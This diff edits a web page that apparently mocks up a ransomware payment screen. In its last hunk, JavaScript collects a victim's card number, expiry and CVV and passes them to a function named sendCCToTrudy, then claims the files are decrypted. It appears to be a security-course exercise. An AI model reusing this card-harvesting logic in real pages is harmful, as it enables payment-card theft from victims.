@@ -12,8 +12,6 @@
 src="https://code.jquery.com/jquery-3.2.1.min.js"
 integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
 crossorigin="anonymous"></script>
-<!-- Latest compiled and minified JavaScript -->
-<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
 <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
@@ -71,7 +69,7 @@ body,h1,h2,h3,h4,h5,h6 {font-family: "Lato", sans-serif}
                 </select>
               </div>
               <div class="col-xs-3">
-                <select class="form-control" name="expiry-year">
+                <select class="form-control" id="expiry-year">
                   <option value="17">2017</option>
                   <option value="18">2018</option>
                   <option value="19">2019</option>
@@ -145,10 +143,10 @@ body,h1,h2,h3,h4,h5,h6 {font-family: "Lato", sans-serif}
   //         + '\nLuhn validation: ' + result.luhn_valid);
   //   });
   function getPaymentAndDecrypt(){
-    var cc = $('#card-number').val();
-    var expDate = $('#expiry-month').val();
-    expDate +='/' + $('#expiry-year').val();
-    var cvv = $('#cvv').val();
+    var cc = document.getElementById('card-number').value;
+    var expDate = document.getElementById('expiry-month').value;
+    expDate +='/' + document.getElementById('expiry-year').value;
+    var cvv = document.getElementById('cvv').value;
 
     if(sendCCToTrudy(cc, cvv, expDate)) {
        alert("Thank you! your files have been decrypted");
